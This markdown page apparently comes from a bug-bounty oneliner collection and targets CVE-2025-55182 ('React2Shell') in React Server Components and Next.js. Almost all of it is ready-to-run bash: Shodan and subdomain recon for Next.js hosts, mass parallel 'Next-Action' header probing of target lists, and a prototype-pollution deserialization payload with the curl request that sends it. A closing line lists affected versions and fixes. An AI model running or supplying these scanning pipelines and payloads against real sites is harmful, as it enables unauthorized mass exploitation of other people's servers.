[← Back to README](../Readme.md)

---

## 🆕 Oneliners 2024-2025

### ⚡🔥⚡ React2Shell - CVE-2025-55182 (CVSS 10.0 - CRITICAL) ⚡🔥⚡

> **💀 Critical RCE in React Server Components & Next.js - Under active exploitation! Added to CISA KEV 💀**

#### ⚡ Detect Next.js Apps (Recon First)
```bash
cat alive.txt | httpx -silent -match-string "/_next/" -match-string "__NEXT_DATA__" | anew nextjs_targets.txt
```

#### ⚡ Check if Next-Action Header is Accepted
```bash
curl -s -o /dev/null -w "%{http_code}" -X POST https://target.com -H "Next-Action: test" -H "Content-Type: text/plain" --data '0'
```

#### ⚡ Mass Detection - Next-Action Header Accepted
```bash
cat alive.txt | xargs -I@ -P20 sh -c 'RES=$(curl -s -o /dev/null -w "%{http_code}" -X POST @ -H "Next-Action: x" --data "0" 2>/dev/null); [ "$RES" != "404" ] && [ "$RES" != "000" ] && echo "POTENTIALLY VULN: @ [$RES]"' | tee react2shell_candidates.txt
```

#### ⚡ Create Payload Files for Testing
```bash
# Create payload.json (safe math check - no RCE)
echo '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B0\"}","_response":{"_prefix":"7*7","_formData":{"get":"$1:constructor:constructor"}}}' > payload.json && echo '"$@0"' > trigger.txt
```

#### ⚡ Manual Vulnerability Check with cURL
```bash
curl -X POST https://target.com -H "Next-Action: check" -F "0=@payload.json" -F "1=@trigger.txt" --max-time 5 -v 2>&1 | grep -iE "(49|error|stack|trace)"
```

#### ⚡ One-liner: Full Detection Pipeline
```bash
subfinder -d target.com -silent | httpx -silent | while read url; do CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$url" -H "Next-Action: x" -H "Content-Type: text/plain" --data "0" 2>/dev/null); [[ "$CODE" =~ ^(200|400|500)$ ]] && echo "[NEXT-ACTION ACCEPTED] $url - HTTP $CODE"; done | tee nextjs_react2shell.txt
```

#### ⚡ Detect Vulnerable Response Headers
```bash
cat nextjs_targets.txt | xargs -I@ -P10 sh -c 'curl -s -I -X POST @ -H "Next-Action: test" 2>/dev/null | grep -qi "x-action-redirect" && echo "VULN INDICATOR: @"'
```

#### ⚡ Mass Scan with httpx + Next-Action Probe
```bash
cat alive.txt | httpx -silent -method POST -H "Next-Action: probe" -mc 200,400,500 -title -tech-detect | grep -i "next" | anew react2shell_potential.txt
```

#### ⚡ Shodan Dork for Next.js Targets
```bash
shodan search "X-Powered-By: Next.js" --fields ip_str,port,hostnames | awk '{print "https://"$1":"$2}' | httpx -silent | anew shodan_nextjs.txt
```

#### ⚡ Nuclei Template Check
```bash
nuclei -l nextjs_targets.txt -t http/cves/2025/CVE-2025-55182.yaml -c 30 -o react2shell_nuclei.txt
```

#### ⚡ Find & Test - Complete One-liner
```bash
subfinder -d target.com -silent | httpx -silent -match-string "/_next/" | tee nextjs.txt | xargs -I@ -P15 sh -c 'R=$(curl -s -w "\n%{http_code}" -X POST @ -H "Next-Action: x" --data "test" 2>/dev/null | tail -1); [ "$R" = "200" ] || [ "$R" = "400" ] && echo "[!] REACT2SHELL CANDIDATE: @"' | anew vuln_candidates.txt
```

#### ⚡ Check RSC Endpoint Directly
```bash
curl -s -X POST "https://target.com/" -H "Next-Action: whatever" -H "Content-Type: multipart/form-data; boundary=----FormBoundary" --data-binary $'------FormBoundary\r\nContent-Disposition: form-data; name="0"\r\n\r\ntest\r\n------FormBoundary--' | head -c 500
```

#### ⚡ Batch Test from File with Parallel
```bash
cat urls.txt | parallel -j20 'curl -s -o /dev/null -w "{} - %{http_code}\n" -X POST {} -H "Next-Action: test" --data "0" 2>/dev/null' | grep -E " - (200|400|500)$" | tee react2shell_batch.txt
```

> **⚠️ Affected:** React 19.0.0-19.2.0, Next.js 15.0.4-16.0.6 | **✅ Fix:** Update to React 19.0.1/19.1.2/19.2.1
>
> **🎯 Key Detection:** Apps accepting `Next-Action` header + RSC deserialization = Potential RCE

---

[← Back to README](../Readme.md)
